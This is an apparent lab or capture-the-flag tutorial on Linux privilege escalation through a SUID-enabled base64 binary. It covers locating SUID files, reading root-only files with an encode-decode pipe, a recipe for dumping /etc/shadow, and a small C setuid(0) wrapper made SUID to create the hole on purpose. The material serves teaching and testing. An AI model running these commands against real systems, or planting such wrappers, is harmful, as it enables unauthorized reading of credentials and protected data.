# SUID Exploitation via base64

*Understanding SUID misconfigurations and exploiting them to read protected files*

---

## Introduction

Linux file permissions control who can read, write, and execute files. Normally, when you run a program, it runs with *your* privileges — if you can't read a file, neither can the program you're running. SUID (Set User ID) is a special permission bit that changes this: when set on an executable, the program runs with the privileges of the file's *owner*, not the person who invoked it.

This is intentional and useful in controlled cases — `passwd` uses SUID so ordinary users can update `/etc/shadow` without being root. But when a sysadmin sets SUID on a general-purpose utility like `base64`, they've handed anyone on the system a root-powered file reader.

This document covers what SUID is, how to find misconfigured binaries, and how to exploit a SUID `base64` to read a file you shouldn't have access to.

---

## How SUID Works

When Linux executes a file, it checks the SUID bit. If set, the kernel swaps your effective UID for the file owner's UID for the duration of that process.

```
you (attacker, uid=1001)
        |
        | run base64
        v
kernel checks: is SUID set on /bin/base64?
        |
       yes → effective UID becomes root (uid=0)
        |
        v
base64 reads /secret.flag  ← root can read anything
        |
        v
output returned to your terminal
```

The file `/secret.flag` is `chmod 600` owned by `not_adam`. Normally `attacker` gets `Permission denied`. But because `base64` is running as root, the kernel allows the read — and the output lands back in your terminal.

---

## Anatomy of the Command

```sh
base64 /secret.flag | base64 -d
```

| part | job |
|------|-----|
| `base64` | the SUID binary — runs as root, reads the file |
| `/secret.flag` | the file you want to read |
| `\|` | pipes encoded output to the next command |
| `base64 -d` | decodes the base64 back to plaintext |

Why encode then immediately decode? `base64` doesn't have a "just print the file" mode — it always encodes. The decode step is just undoing that to get the original content back.

---

## Finding SUID Binaries

Before you can exploit SUID, you need to find misconfigured binaries. The standard way:

```sh
find / -perm -4000 -type f 2>/dev/null
```

| part | meaning |
|------|---------|
| `find /` | search from root |
| `-perm -4000` | match files with SUID bit set |
| `-type f` | regular files only (not symlinks or dirs) |
| `2>/dev/null` | suppress permission errors on dirs you can't read |

Once you have a candidate, confirm it:

```sh
ls -la $(which base64)
```

Look for `s` in the owner execute position:

```
-rwsr-xr-x 1 root root 16234 Aug  8 05:17 /bin/base64
 ^^^
 rws = SUID set, owned by root = runs as root
```

---

## Why base64 Specifically?

Many SUID binaries are dangerous — `find`, `vim`, `python`, `base64` all appear on GTFOBins (a reference for Unix binary abuse). `base64` is particularly clean for file reading because:

- It takes a filename as an argument
- It reads the whole file and prints it
- It has no interactive mode to navigate
- The encode/decode round-trip is trivial

| binary | can read files? | notes |
|--------|----------------|-------|
| `base64` | ✅ | encode → decode, simple |
| `cat` | ✅ | direct — but rarely misconfigured with SUID |
| `find` | ✅ | via `-exec` |
| `vim` | ✅ | opens files directly, also allows shell escape |
| `python` | ✅ | `open('/secret.flag').read()` |

---

## The SUID Symlink Trap

On Alpine Linux, `base64` from `coreutils` installs as a symlink to the BusyBox multi-call binary:

```sh
ls -la /bin/base64
lrwxrwxrwx 1 root root 9 Aug  8 05:17 /bin/base64 -> coreutils
```

SUID on a symlink is silently ignored by the kernel — the bit is stored on the symlink inode, but execution follows the target, which doesn't have SUID set. This means `chmod u+s /bin/base64` appears to work but does nothing useful.

The fix is to compile a real ELF binary and place it at that path:

```c
#include <unistd.h>
int main(int c, char **v) {
    setuid(0);
    setgid(0);
    return execlp("/bin/base64", "base64", v[1], NULL);
}
```

```sh
rm /bin/base64
gcc -o /bin/base64 /tmp/b64.c
chmod u+s /bin/base64
```

Now `ls -la /bin/base64` shows a real file with `rws`.

---

## Recipes

### Find all SUID binaries on the system

```sh
find / -perm -4000 -type f 2>/dev/null
```

### Confirm a binary has SUID set

```sh
ls -la $(which base64)
# look for -rwsr-xr-x, owner root
```

### Read a protected file via SUID base64

```sh
base64 /secret.flag | base64 -d
```

### Read /etc/shadow (if base64 is SUID root)

```sh
base64 /etc/shadow | base64 -d
```

### Write output to a file

```sh
base64 /secret.flag | base64 -d > /tmp/flag.txt
```

---

## What Can Go Wrong

| symptom | likely cause |
|---------|-------------|
| `Permission denied` when running `base64` | Binary doesn't have SUID set, or owner isn't root |
| `base64: /secret.flag: Permission denied` | Running the wrong `base64` — not the SUID one |
| Output is garbled / looks like base64 | Forgot `\| base64 -d` — you're seeing the encoded form |
| `ls -la` shows `l` at start | That's a symlink — SUID on symlinks is ignored |
| `find` returns nothing | Piped stderr incorrectly, or no SUID binaries present |
| Binary runs but outputs nothing | File is empty, or path is wrong |

---

## Further Reading

- [GTFOBins — base64](https://gtfobins.github.io/gtfobins/base64/) — catalogue of Unix binary abuse including SUID
- [Linux man page — chmod](https://man7.org/linux/man-pages/man1/chmod.1.html) — includes SUID/SGID/sticky bit documentation
- [Linux man page — execve](https://man7.org/linux/man-pages/man2/execve.2.html) — how the kernel handles SUID during exec
- [GTFOBins](https://gtfobins.github.io/) — full list of exploitable binaries
- [HackTricks — SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-and-sgid) — broader privilege escalation context